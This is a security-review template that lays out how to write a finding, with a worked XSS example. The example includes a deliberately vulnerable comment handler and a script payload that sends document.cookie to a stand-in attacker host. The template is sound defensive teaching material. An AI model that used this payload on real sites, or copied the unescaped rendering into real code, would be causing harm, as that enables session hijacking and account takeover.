# Review Template: The Finding Format

A security finding is actionable or it isn't a finding. "This looks vulnerable to XSS" is a feeling. "The `content` field at `handlers.py:47` is passed unescaped to `response.write()`; any `<script>` payload reaches the user's DOM" is a finding.

This template specifies the structure Mudge-style reviews use. Every finding has: name, evidence, mechanism, blast radius, specific fix, residual risk. No hedging, no vendor deference, no "it depends."

---

## The Finding Template

```markdown
## F-NN: <short imperative name>

**File:** `path/to/file.py:LINE`

**Evidence (code):**
```language
<the exact code, unmodified, with a few lines of context>
```

**Mechanism:** <how the attack actually runs. One paragraph. Name the inputs, the sinks,
and the intermediate steps. Avoid abstract language — concrete verbs, concrete data.>

**Blast radius:** <what the attacker gets when this works. Be specific:
data type, privilege level, persistence, cross-tenant reach.>

**Likelihood:** <pre-auth vs post-auth; trivial vs chain of N conditions;
publicly reachable vs internal.>

**Fix:**
```language
<the concrete replacement code, or a specific enough description that
the person fixing doesn't have to re-derive the solution>
```

**Why this fix:** <one sentence naming the principle the fix honors —
e.g., "encodes at the sink, honoring complete mediation."
This is the MOTIVATION, not filler.>

**Residual risk (after fix):** <what this fix does NOT cover, and why
that's acceptable — OR a pointer to a separate finding for the residual.>

**Verification:** <how to check the fix works. Usually a concrete test
or a concrete reproduction.>
```

---

## Example: a concrete filled-in finding

```markdown
## F-03: Unescaped user content rendered into HTML response

**File:** `services/blog/handlers.py:47`

**Evidence (code):**
```python
def render_comment(comment: Comment) -> str:
    return f"<div class='comment'>{comment.body}</div>"

@app.post("/posts/{post_id}/comments")
def add_comment(post_id: int, body: str):
    comment = db.save_comment(post_id, body)
    return HTMLResponse(render_comment(comment))
```

**Mechanism:** `comment.body` is user-controlled input persisted from
the `POST /posts/{post_id}/comments` endpoint. `render_comment` interpolates
it directly into an HTML string with no escaping. A user submits
`<script>fetch('https://attacker.example/?c='+document.cookie)</script>`
as their comment body; when any other user loads the page, the script
executes in their browser with the victim's session cookie and posts it
to the attacker's server.

**Blast radius:** session hijack against any authenticated viewer of the
post. With session cookies not marked `HttpOnly` (verify separately —
see F-06), this yields account takeover on every account that views a
comment.

**Likelihood:** high. Pre-auth: anyone can post a comment (or post via
an account they registered in 30 seconds). Exploitation is trivial:
one-liner payload, no chain required.

**Fix:**
```python
import html

def render_comment(comment: Comment) -> str:
    return f"<div class='comment'>{html.escape(comment.body)}</div>"
```

Better: switch to a templating engine with autoescape by default
(`jinja2.Environment(autoescape=True)`), so this class of bug is impossible
to reintroduce in future handlers.

**Why this fix:** encodes untrusted content at the sink, honoring complete
mediation and eliminating the XSS class via autoescape (CISA SBD's "eliminate
vulnerability classes at the root"). `html.escape` is vetted stdlib; this is
NIST SSDF PW.4 (reuse well-secured software).

**Residual risk (after fix):** `html.escape` handles HTML tag contexts but
not JS-context (inside `<script>`), URL-context (inside `href`), or CSS-context
(inside `style`). If future code inserts `comment.body` into any of those
contexts, a different encoder is required. Autoescape template handles this
correctly via context detection.

**Verification:**
```python
def test_F03_comment_renders_script_tags_as_text():
    resp = client.post("/posts/1/comments",
                       json={"body": "<script>alert(1)</script>"})
    page = client.get("/posts/1").text
    assert "<script>alert(1)</script>" not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page
```
```

---

## Why This Structure

### Name is imperative

"F-03: Unescaped user content rendered into HTML response" — not "Potential XSS in blog handler". The name states what's wrong, not what *might* be wrong. If there's genuine uncertainty, the finding belongs in a separate "investigation needed" section, not in the findings list.

### Evidence is code, not description

The actual code appears in the finding, with enough context to verify without re-opening the file. A reviewer evaluating ten findings shouldn't have to git-blame each one to understand what's being claimed.

### Mechanism is the attack, narrated

The attack runs end to end. An attacker reading the finding should be able to reproduce it. A defender reading the finding should see exactly where the architecture failed.

### Blast radius names the stakes concretely

"Data loss" is weak. "Read access to all users' private messages in the last 30 days, across all tenants, via the `/admin/audit` endpoint" is a finding someone can triage.

### Fix is specific, not "review for this class of issue"

A finding that ends with "consider using a safer pattern" is half a finding. Close it with code the person fixing can paste. When the class matters more than the instance, say so and cite the class-elimination path (autoescape templating, parameterized queries, memory-safe language).

### Why-this-fix is the principle

This is where the motivation lives. Not "fixes the vulnerability" (tautology). "Honors complete mediation," "eliminates the XSS class at the source," "reduces excessive agency per OWASP LLM06" — that's the principle the fix honors.

### Residual risk is a self-audit

Every fix leaves something uncovered. Naming it prevents the fix from becoming its own false-confidence trap.

### Verification is a test

If the fix isn't verifiable, the "fix" is hope. Tests are the contract that the finding actually closes.

---

## The Summary Structure (for a whole review)

For a multi-finding review, open with a summary. Keep it to a page.

```markdown
# Security Review: <subsystem name> (<reviewer>, <date>)

## Scope
<what was reviewed, what wasn't, who asked>

## Verdict
<one line: ship / ship with caveats / do not ship>

## Findings Summary
| ID | Severity | Title | Status |
|---|---|---|---|
| F-01 | critical | Authentication bypass via... | open |
| F-02 | high | Unescaped user content... | open |
| F-03 | medium | Missing CSRF token on... | open |

## Recommendations
- <concrete, prioritized actions>

## Out of Scope / Accepted Risks
- <what was considered and explicitly not flagged, with reasoning>

---

# Findings

## F-01: ...
<filled-in template>

## F-02: ...
...
```

---

## Anti-patterns (what NOT to produce)

- **"Review for SQL injection in this service."** Nothing-finding. Either you found one (specific location, payload, fix), or there isn't one (say so explicitly).
- **"Consider using prepared statements."** Not a finding — a suggestion. A finding says where prepared statements are missing and what replaces the concatenated SQL.
- **"This could potentially be vulnerable under certain conditions."** Weaselly. Either demonstrate the conditions and the exploit, or remove the finding.
- **"The code has a security smell."** Smells aren't findings. What's the vulnerability, where, how, and what's the fix?
- **"Recommend a defense-in-depth approach."** What layers? What orthogonal failure modes? Generic "defense in depth" is security theater dressed as advice.

The bar: if the developer closes the finding with "OK, done," is there a verifiable change in the code that is demonstrably better? If yes, the finding is real. If no, the finding needs sharpening.
